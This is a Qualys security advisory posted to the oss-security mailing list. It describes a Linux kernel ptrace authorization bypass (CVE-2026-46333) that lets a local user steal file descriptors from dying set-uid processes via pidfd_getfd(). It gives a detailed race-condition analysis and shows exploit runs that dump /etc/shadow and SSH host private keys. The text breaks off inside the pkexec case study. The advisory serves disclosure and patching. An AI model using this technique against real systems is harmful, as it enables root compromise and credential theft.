Received: (qmail 30191 invoked by uid 550); 20 May 2026 15:46:23 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 30154 invoked from network); 20 May 2026 15:46:22 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=
	content-id:content-transfer-encoding:content-type:date:from
	:in-reply-to:message-id:mime-version:references:subject:to; s=
	qualyscom; bh=8xznK8xU8CKSSHAAjxWxs2YO6iA1QYazMGCy8idN5Xw=; b=Fb
	fJKPQCFAvVbyRd5lz6ptrm/xW8kZBgF+e02IE84KvIeemD+YVA7pVqAvMbdgDGMr
	PPKI8yEnW1bJUAY9gbeE9EYHpAy1+GOdGOHdIxP8MboJlzi/8qYdzmdgHffNrTYD
	f39f0ExO7IObsSk8XxX6zqSv7j3qFjWPlNkctIA79TVQkij3iodHcaLCxbsw5+k7
	/CloaoBqZmZSewCbvfuCSpevBubrvOloFhFD8mOawtMYy76PV8ljcJe3enPzwBsf
	rFU63p4t31A9gmFyY5qiQdRHIshtHa8GMEZqius3SQ70sMVZultqj9voNKFDxs5I
	qewOugh4jdwWkWpW8glg==
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=zV74uJQStO5vJRTc73sEVf85m2Mc2EFVgeRDWYw9wGN2yhN/bmwe+N2cTQ2M7Wi0g4yc+LXNjZqzrzYTYJJiuhjqQRV9pgjj7Xx4eDmH0TTdHn1OP9Ffbxw1FeJ2oyDBQPi7Kqm1GqvIPb8EVIWmKjj8LGOttxYzDSzganlGQG2nf/6DiqO7fjYWCYxwypti7exdqWgegS3RBsmg9w1nLSJj6PhOIftTfR5dDV5pvVHnFN4Fx3IKMbnGaxjJBFMSQrAclUg0UO2n+3vVgYI0pbBNwUE73tNIVfNrQQystzjG7zTMkdXPo9a23enW90qFZTlu8zC+G08AbDhVvPe2fw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=8xznK8xU8CKSSHAAjxWxs2YO6iA1QYazMGCy8idN5Xw=;
 b=ss5/R+yPL4V5olG7JIMrPka+RocVSL5SeoIwjE72nM/jclElc8847zC8ofyT8Svu8krcIJeO0k1Oq//SMV6GH70e+UkUqAFrNmc6o7MThb5/kR4h+WEipVQ5NTOkuOeYMM4dqcRYMUe+rRcW1x/FdOcWSI51A8dVnNbabWCCFSQF1IwMJUa5DUyO0/FPO9LuaME0ysoLaJLa7WpuPtyA38vqyNmd5Uk4x8oi+mBNTjrFd1AVn8GaB/2ng8QwjDGrqtiIhrpC1INUoLfF7i8mXoSy1MKiQL90+NrBHVRWcCifowOd/m0bv38mggjc/FrbfQ5FRvi1kkJIGKRSTGxgZA==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
 dkim=pass header.d=qualys.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=qualys.onmicrosoft.com; s=selector1-qualys-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=8xznK8xU8CKSSHAAjxWxs2YO6iA1QYazMGCy8idN5Xw=;
 b=d+XxduRr6EMX4lIEmdnXXAoOuGyqoIFWX6mPtVh6XKlL5xRWQkGPRhzJ3xOLuWfQ4qLeFtOa24OTQq8IkptQVsAll62VQnE/so1EJhxhT7XwPzEOh0HAwzzc7RIPlEzvSHroz2lH1Pk9h2F+o4FzVSBzDf2UHSieYZjY1l4d+BtcGAq8yGNHoXqLjmfIfoeSOxLoByohQxMBzk2lgzIrrfauVXxf82p/SACNJpWZCnSTRdaPPiOhPgMM92rmXq3lVaMkR6EcSL8pJi+/f4RSwq0S5iH5KYyR22bvoOMLYUmyE17yxHwVy7trAS6axmrVgoKoIgsPVWtxa7/z0ZRxfw==
From: Qualys Security Advisory <qsa@qualys.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: Logic bug in the Linux kernel's __ptrace_may_access() function
Thread-Index: AQHc5BFx3Z6qen8xFke8NWRPdnY9HrYXF1EA
Date: Wed, 20 May 2026 15:46:05 +0000
Message-ID: <20260520154548.GB1738@localhost.localdomain>
References: <20260515022033.GA10889@localhost.localdomain>
In-Reply-To: <20260515022033.GA10889@localhost.localdomain>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach:
X-MS-TNEF-Correlator:
x-ms-publictraffictype: Email
x-ms-traffictypediagnostic: LV5PR06MB11218:EE_|SJ0PR06MB7632:EE_
x-ms-office365-filtering-correlation-id: e8e2b3b2-1101-4c4b-78a0-08deb686e76d
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam:
 BCL:0;ARA:13230040|366016|376014|1800799024|11063799006|3023799007|18002099003|56012099003|22082099003|4133799003|20046099003|38070700021|6133799003;
x-microsoft-antispam-message-info:
 3czmhG6hG9UZ18LjF9ToXGhYb7phHNn7e1cH7CPb+u6TcKbp7j0QFUULfo9VzCr/l6hvad2mkPif/YJJIQq55K51mq687THy/sza/dYSKwnSTEWZcDnot3XPxnUkPpTaSGYH3CMI/SpB32dmJ4gJNgjuRf1SUJsaO0dEzvBhllnhzljtTTHkLwVatMw71kQ+NhjvCBXBwdg3ZtI1lhTl0NIHvpL8qUC7v12e7dXS/u8lAasYnKO1X9xm9Wv1pRC3BzJPjHgEBROfC0xK5enU041GS8YX4LtYKT3NQmOUbOeQ8uqgQigofOGtHnM8+RzZQXTVBBY3NUVSG3HRFScJXewFrZ3nzDMbNigAiBKuiEH1ka5cXmC7rfo2dkLM0UN3178yxxUwnMtnqO3XGhZkl64R6UJ7H+RTpzrADq2HPSlYxrirUka6fgJXN3BCidpk59nEKvC4AM4FHmgtrmQJrydFVVUvVZ3NN6ACd5VjaAbOQCNK9UnjtKfQyd+aSoqLq4A2mKlJSzWhNoATEVMT7xDnsLDrcE1wmtnjOA3tNDQzJDzAclaFWY59HIGN0LKVESZOgndoKzr6FDrKWEGxbPWSondcknDIxOxfuqOy+S42vY5DjBQ1VfYfZJ2as9mSse375M3f1D9WciKT3370brhz7nkTQwUo0JqKUsVjdPlt6W/G5g52JmWMjtUH3dfrnvrGkUl2ZcBK+WJHMz4Vgg==
x-forefront-antispam-report:
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:LV5PR06MB11218.namprd06.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(366016)(376014)(1800799024)(11063799006)(3023799007)(18002099003)(56012099003)(22082099003)(4133799003)(20046099003)(38070700021)(6133799003);DIR:OUT;SFP:1102;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0:
 =?us-ascii?Q?rT1hQqfNV0CbtB21JJfjoDHdl674UEE8vJcCvght9We9FnAS6NxqgwM1CDBQ?=
 =?us-ascii?Q?YaXlG393YiHIiQZf4bHzPOLE9XCWXoW4VQZ4FJJy4qceM9qraBm4ZxoGb9Jt?=
 =?us-ascii?Q?hY/Ve8KT/FgIjtrq45xZ8k798iegGnciaKMYCjmYPffoTMFl5CqEIgEdn4YT?=
 =?us-ascii?Q?uo5dHSijDEJ8EQMUmVF410a+7MM20zYh72tTYwLPUMYYWfjIo8OqcOJ8clGn?=
 =?us-ascii?Q?ecYq2dcVL/4bqYVz5T1BU8zV6xv3H7aVWSsA82bOOmLnOGiCYmfBV2fc5yAe?=
 =?us-ascii?Q?5EXtEL0VDceIg3LzhkxwgykdOtJxZDu6GTnj6qcXDpILEakOxkEXSZH8fXHy?=
 =?us-ascii?Q?eU0fxTn2+dINxeIQDQkALK/vGb1mRdffZDI/BpX/Nh8R/BoTRTNVwHh8ymCr?=
 =?us-ascii?Q?roCkaRD1zaHMVj6Kw6ulh4+dN/sWbN8qsbqEa5c5tVNW+0aOmbG/3R3vas7G?=
 =?us-ascii?Q?Be1rrbDFeLf6Bm5Szh8F7RsCjeUb8Itvlr0WLYljIog3mR4KnAtOn9SS/MuW?=
 =?us-ascii?Q?FQBnSl/STI3KviiNN4ryiWd6h9hj9xgTMd1W/iomRJAJecFvkNf80W560qc0?=
 =?us-ascii?Q?U27voH3ZyNpaQ3utypjK0PXX/nD0dgPTF8M6cmjid3r5rHgB2r1VY1QeZqJM?=
 =?us-ascii?Q?ItxH8uuah6wdSp3vs4XF/y7utmJpunEQ28Zbtf9mUXz/1nYdtcKoutLchKcd?=
 =?us-ascii?Q?c/NPxtWEPUQCFYP21sIeGR6B9+Bv535Zt2hX3ExHf2ZPCf9eXfP4g5tiS0qH?=
 =?us-ascii?Q?oOQ4I3Zpt9vjLwJX6WkptpQs8OIEZArbHGipqegcjKCA02+nP7IdelrM0Ns0?=
 =?us-ascii?Q?TToDl8+QvwWjhuP51MX4aZpwvsf+7hSMof3ptjGcf0ZK3/+fjH2l0e2dBOQW?=
 =?us-ascii?Q?WPAifsltN9Rynz4xSGoNPx1USyjIdgFrUTE06emj9wYqVwXMQDMcrjfWxN2g?=
 =?us-ascii?Q?wh9xdwC7T0VL8q85WMFba5SN4egEoOpertm6zfPFLfe1kS9dy6kdlNEyTXR9?=
 =?us-ascii?Q?0RinQnK9QxNDSdHhYmac5IFJGCt5CbJ4Bnd5UDaKkyaHZXKgu3pgJxzwcWKh?=
 =?us-ascii?Q?bbxGDF09lxzFoOQnQtoP9nzgIgdq7/KV2Y/ZTYYdtBVc2cfYuTaqRFeNxArJ?=
 =?us-ascii?Q?bvQMHl7fbVp0/LSRWZ0AK+Ip2zhAnrRHRZ9ZqjK4AMboSaLYZJ452R5JGtGt?=
 =?us-ascii?Q?05mfwzsS/HGh7e4fS77ZEEW1FAksuwFzONdCelQx+hNz34MMzugny/doLQMw?=
 =?us-ascii?Q?novY1A8icHXQXWCVWtgyH8/ogD0ujqdSUwTNhadRUN15if/y8XZ1U2n0kGII?=
 =?us-ascii?Q?MxVE4+hZyH8bOlZpm4X67htxqfp/Z4+z1NKh99ftBYTxAHo0mSlwCPJqnt37?=
 =?us-ascii?Q?9C4wNNcC2JJIQJj42oQqgkRWJpCC4E7MUHUxdMvjJNZoifpNmpVmiKNVvZ51?=
 =?us-ascii?Q?NEx6jHr9HEevxUTMphVW2Lt9adEB3bwsZO4PsdXE6jLjW8D6VTl2MDXJHh/s?=
 =?us-ascii?Q?A5MMdbQsyBtzgN5wwdebhHu6gXeklYjREYOfG3jnAnS12MTJECy5G5vw0fSt?=
 =?us-ascii?Q?sRINSz/YBEywfR8Ej1hK2WANxk4on76DObgLCvMl2NLgyyzvdg44DE0cLnZB?=
 =?us-ascii?Q?Vb9cWN6Ock2G0cO8+43Jf+FdczKZafiHOT8moxZsFyOFjiW9P2Se49/FamdO?=
 =?us-ascii?Q?o/agMXUiDzMikskNeNIQTdAl17cWvDybrnzJ6PUXqRfy9tWuwzZRk1WYWj8K?=
 =?us-ascii?Q?RS4yvPwzjhCz6Nm2UXfP4k46eSbL0hM=3D?=
Content-Type: text/plain; charset="us-ascii"
Content-ID: <9BAAF70C44A7E945BA68F61EDFB521C7@namprd06.prod.outlook.com>
Content-Transfer-Encoding: quoted-printable
MIME-Version: 1.0
X-Exchange-RoutingPolicyChecked:
	bXI4YskDcqf3Mfq3ulG01eaKgYhooFtTNq/xR7EMvHn1kQd8F6Oilh3Y6kBgs/WDw3+UJSjAsIz8mXuvLEVFs2LwzXQKZw7sWpIDz8zhcTsyx275JuxtC+9GJDvWBa147G4wo9rsfGjl2FP0/V98DrWAZYIJLPVwvySzIslWMd5p4aF3NipR784rEmq1udZ9P7bLs4AI9cLMJEv56RHrnLeIELfUmfTBI1+6ZFngmmD0m2gbzm76cLww/47aMVLb3pc0dRI14lyfPN4p0A1ck+eg91V/L7RvhKsfuyAi2YkgGJ/tKfiw900L+z+3pyT5pY9B9mhO+n7JxLwHxA75kQ==
X-OriginatorOrg: qualys.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: LV5PR06MB11218.namprd06.prod.outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: e8e2b3b2-1101-4c4b-78a0-08deb686e76d
X-MS-Exchange-CrossTenant-originalarrivaltime: 20 May 2026 15:46:05.7222
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: X1jGFLgP8Yitnn07g/vdTVeGJiDmAQotG8Qd4DlKYNrHndpFVa9oKqJkdDbwo0pjpFD8LeS2OnR0W4exl4EQPBnZtWvbmZjt0+D9fGtqwp8=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: SJ0PR06MB7632
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.293,Aquarius:18.0.1143,Hydra:6.1.51,FMLib:17.12.100.49
 definitions=2026-05-20_03,2026-05-18_01,2025-10-01_01
Subject: [oss-security] Re: Logic bug in the Linux kernel's __ptrace_may_access() function


Qualys Security Advisory

Logic bug in the Linux kernel's __ptrace_may_access() function
(CVE-2026-46333)


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Contents
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Summary
Analysis
Case study: chage
Case study: ssh-keysign
Case study: pkexec
Case study: accounts-daemon
Acknowledgments
Timeline


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Summary
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

We discovered a logic bug (an authorization bypass) in the Linux
kernel's __ptrace_may_access() function. This vulnerability is locally
exploitable for information disclosure and arbitrary command execution
as root. To the best of our knowledge, it was introduced in November
2016 (v4.10-rc1) by commit bfedb58 ("mm: Add a user_ns owner to
mm_struct and fix ptrace permission checks").

We developed four different exploits for this vulnerability (all of them
rely on the pidfd_getfd() syscall, which was introduced in January 2020
(v5.6-rc1), but other exploitation methods might exist):

- An exploit against chage (a set-uid-root or set-gid-shadow binary),
  which allows a local attacker to disclose the contents of /etc/shadow
  (the system's password hashes). We successfully tested this exploit on
  the default installations of Debian 13, Ubuntu 24.04 and 26.04, Fedora
  43 and 44; other distributions may also be exploitable.

- An exploit against ssh-keysign (a set-uid-root binary), which allows a
  local attacker to disclose the host's private keys (/etc/ssh/*_key).
  We successfully tested this exploit on the default installations of
  Debian 13, Ubuntu 24.04 and 26.04; other distributions may also be
  exploitable.

- An exploit against pkexec (a set-uid-root binary), which allows a
  local attacker to execute arbitrary commands as root if the real user
  of the computer is physically sitting at it (the attacker however can
  be remotely logged in to the computer, via sshd for example). We
  successfully tested this exploit on the default installations of
  Debian 13, Ubuntu Desktop 24.04 and 26.04, Fedora Workstation 43 and
  44; other distributions may also be exploitable.

- An exploit against accounts-daemon (a root daemon), which allows a
  local attacker to execute arbitrary commands as root. We successfully
  tested this exploit on the default installations of Debian 13, Fedora
  Workstation 43 and 44; other distributions may also be exploitable,
  but Ubuntu is notably not because it enables the Yama ptrace
  protection by default (it sets kernel.yama.ptrace_scope to 1).

Please note that we have not exhaustively searched for exploitable
userland programs (set-uid, set-gid, set-capabilities binaries, and root
daemons); we simply remembered the four that we found from past research
projects, and other, possibly better, exploitable programs may exist.

Last-minute note: on Friday, May 15, 2026, we pre-published relevant
information at https://www.openwall.com/lists/oss-security/2026/05/15/2
and https://www.openwall.com/lists/oss-security/2026/05/15/8.


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Analysis
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

An unprivileged user who wants to successfully call ptrace(),
process_vm_readv(), process_vm_writev(), or pidfd_getfd() on a process,
or access one of this process's sensitive files in /proc/pid, must first
pass two security checks in __ptrace_may_access():

------------------------------------------------------------------------
 276 static int __ptrace_may_access(struct task_struct *task, unsigned int =
mode)
 277 {
 ...
 316         tcred =3D __task_cred(task);
 317         if (uid_eq(caller_uid, tcred->euid) &&
 318             uid_eq(caller_uid, tcred->suid) &&
 319             uid_eq(caller_uid, tcred->uid)  &&
 320             gid_eq(caller_gid, tcred->egid) &&
 321             gid_eq(caller_gid, tcred->sgid) &&
 322             gid_eq(caller_gid, tcred->gid))
 323                 goto ok;
 ...
 328 ok:
 ...
 340         mm =3D task->mm;
 341         if (mm &&
 342             ((get_dumpable(mm) !=3D SUID_DUMP_USER) &&
 343              !ptrace_has_cap(mm->user_ns, mode)))
 344             return -EPERM;
 345=20
 346         return security_ptrace_access_check(task, mode);
 347 }
------------------------------------------------------------------------

1/ at lines 317-322, the process's effective, saved, real uids and gids
must be equal to the unprivileged user's uid and gid;

2/ at lines 341-342, the process's dumpable flag must be equal to
SUID_DUMP_USER (1).

By default, the kernel automatically sets a process's dumpable flag to
SUID_DUMP_DISABLE (0) if the process changes one of its uids or gids, to
prevent an unprivileged user from extracting sensitive information or
resources from this process. For example, sshd-session changes its root
uid and gid to an authenticated user's uid and gid, but its memory may
still contain secret information (private keys and password hashes).

Unfortunately, the check of the process's dumpable flag at line 342 can
be completely bypassed: if the process's mm pointer is NULL at line 341,
then the unprivileged user (whose uid and gid are equal to the process's
uid and gid) can trick __ptrace_may_access() into returning successfully
at line 346, even if the process's dumpable flag is not actually equal
to SUID_DUMP_USER (i.e., even if this process used to be privileged).

The kernel sets a process's mm pointer to NULL in do_exit(), at line
964, when this process is dying:

------------------------------------------------------------------------
 896 void __noreturn do_exit(long code)
 897 {
 ...
 964         exit_mm();
 ...
 971         exit_files(tsk);
....
1019         do_task_dead();
1020 }
------------------------------------------------------------------------

The question, then, is: what sensitive resources can an attacker steal
from a process that fully dropped its privileges (to the attacker's uid
and gid), after this process's mm pointer was set to NULL at line 964,
but before this process dies completely at line 1019?

Eventually, we found an answer to this question in the pidfd_getfd()
syscall:

------------------------------------------------------------------------
947 SYSCALL_DEFINE3(pidfd_getfd, int, pidfd, int, fd,
948                 unsigned int, flags)
949 {
...
964         return pidfd_getfd(pid, fd);
------------------------------------------------------------------------
910 static int pidfd_getfd(struct pid *pid, int fd)
911 {
...
920         file =3D __pidfd_fget(task, fd);
------------------------------------------------------------------------
872 static struct file *__pidfd_fget(struct task_struct *task, int fd)
873 {
...
881         if (ptrace_may_access(task, PTRACE_MODE_ATTACH_REALCREDS))
882                 file =3D fget_task(task, fd);
------------------------------------------------------------------------
1123 struct file *fget_task(struct task_struct *task, unsigned int fd)
1124 {
....
1128         if (task->files)
1129                 file =3D __fget_files(task->files, fd, 0);
------------------------------------------------------------------------

- if we (attackers) SIGKILL a process immediately after it dropped its
  privileges to our own uid and gid;

- and if we call pidfd_getfd() on this process after its mm pointer was
  set to NULL (in do_exit(), at line 964) but before its files pointer
  is set to NULL (in do_exit(), at line 971);

- then the call to ptrace_may_access() at line 881 succeeds (because the
  process's uid and gid are equal to our own unprivileged uid and gid at
  lines 317-322, and because its mm pointer is NULL at line 341 and
  therefore bypasses the check of the dumpable flag at line 342);

- and we can steal any one of the process's open file descriptors at
  line 1129, and use it as our own.


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Case study: chage
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

chage is a set-uid-root or set-gid-shadow binary from the shadow-utils,
installed by default on most Linux distributions. If we execute it with
the -l option, then at line 776 it opens /etc/shadow in O_RDONLY mode,
and at lines 778-779 it drops its privileges to our own uid and gid:

------------------------------------------------------------------------
726 int main (int argc, char **argv)
727 {
...
753         ruid =3D getuid ();
754         rgid =3D getgid ();
...
776         open_files (lflg, &flags);
777         /* Drop privileges */
778         if (lflg && (   (setregid (rgid, rgid) !=3D 0)
779                      || (setreuid (ruid, ruid) !=3D 0))) {
------------------------------------------------------------------------

Consequently, if we SIGKILL the chage process immediately after lines
778-779, and call pidfd_getfd() on this process in a tight loop, then
eventually we win the race in do_exit() (between line 964 and line 971),
bypass the check of the dumpable flag in ptrace_may_access(), and can
steal chage's /etc/shadow file descriptor and read its contents:

------------------------------------------------------------------------
$ cat /etc/os-release
PRETTY_NAME=3D"Ubuntu 26.04 LTS"

$ id
uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane)

$ stat /usr/bin/chage
Access: (2755/-rwxr-sr-x)  Uid: (    0/    root)   Gid: (   42/  shadow)

$ ./exploit-chage
root:*:20563:0:99999:7:::
...
john:$6$zejBXeN4uVNvydnA$hwbwcoT24evWSI4SqM1p8YIInVMtqY2CCE.vfudaG1/mIKayCF=
raqWIbY0tSIiLFl.8ZrBm86owPU.Xa8HauQ0:20585:0:99999:7:::
sshd:!*:20585::::::
jane:$y$j9T$r575buH7G8C84ZHsJRiee/$yyVfFeh/EMowm9GhXXC6TdgUGftwYpB8Uffa/k7V=
NE9:20585:0:99999:7:::
------------------------------------------------------------------------


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Case study: ssh-keysign
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

ssh-keysign is a set-uid-root binary from OpenSSH, installed by default
on most Linux distributions. Even though EnableSSHKeysign is disabled by
default in /etc/ssh/ssh_config, at lines 203-205 it opens the host's
private key files (/etc/ssh/*_key), and at line 211 it drops its
privileges:

------------------------------------------------------------------------
176 main(int argc, char **argv)
177 {
...
203         key_fd[i++] =3D open(_PATH_HOST_ECDSA_KEY_FILE, O_RDONLY);
204         key_fd[i++] =3D open(_PATH_HOST_ED25519_KEY_FILE, O_RDONLY);
205         key_fd[i++] =3D open(_PATH_HOST_RSA_KEY_FILE, O_RDONLY);
206=20
207         if ((pw =3D getpwuid(getuid())) =3D=3D NULL)
208                 fatal("getpwuid failed");
209         pw =3D pwcopy(pw);
210=20
211         permanently_set_uid(pw);
...
224         if (options.enable_ssh_keysign !=3D 1)
225                 fatal("ssh-keysign not enabled in %s",
226                     _PATH_HOST_CONFIG_FILE);
------------------------------------------------------------------------

Consequently, if we SIGKILL ssh-keysign immediately after line 211, and
call pidfd_getfd() in a loop, then we can steal any one of ssh-keysign's
/etc/ssh/*_key file descriptors and read its contents:

------------------------------------------------------------------------
$ cat /etc/os-release
PRETTY_NAME=3D"Ubuntu 26.04 LTS"

$ id
uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane)

$ stat /usr/lib/openssh/ssh-keysign
Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)

$ ./exploit-ssh-keysign 3
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
...

$ ./exploit-ssh-keysign 4
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
...

$ ./exploit-ssh-keysign 5
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
------------------------------------------------------------------------


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Case study: pkexec
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

pkexec is a set-uid-root binary from the polkit package, installed by
default on most Linux desktop distributions. On Debian for example, an
"allow_active" user (a user who is physically sitting at the computer)
can execute /usr/libexec/gsd-backlight-helper as root, or as any other
user, via pkexec --user:

------------------------------------------------------------------------
$ cat /etc/os-release
PRETTY_NAME=3D"Debian GNU/Linux 13 (trixie)"

$ cat /usr/share/polkit-1/actions/org.gnome.settings-daemon.plugins.power.p=
olicy
    ...
    <defaults>
      <allow_any>no</allow_any>
      <allow_inactive>no</allow_inactive>
      <allow_active>yes</allow_active>
    </defaults>
    <annotate key=3D"org.freedesktop.policykit.exec.path">/usr/libexec/gsd-=
backlight-helper</annotate>
    ...
------------------------------------------------------------------------
 469 main (int argc, char *argv[])
 470 {
 ...
 585           opt_user =3D g_strdup (argv[n]);
 ...
 641   rc =3D getpwnam_r (opt_user, &pwstruct, pwbuf, sizeof pwbuf, &pw);
....
1024   if (!fdwalk_close_on_exec (3))
....
1086   (void) setregid (pw->pw_gid, pw->pw_gid);
1087   (void) setreuid (pw->pw_uid, pw->pw_uid);
....
1109   if (execv (path, exec_argv) !=3D 0)
------------------------------------------------------------------------

- between line 641 and line 1024, pkexec connects to the system dbus,
  and authenticates this connection as root (with its SCM_CREDENTIALS);

- at line 1024, pkexec sets the close-on-exec flag on all open file
  descriptors >=3D 3, including the file descriptor that is connected to
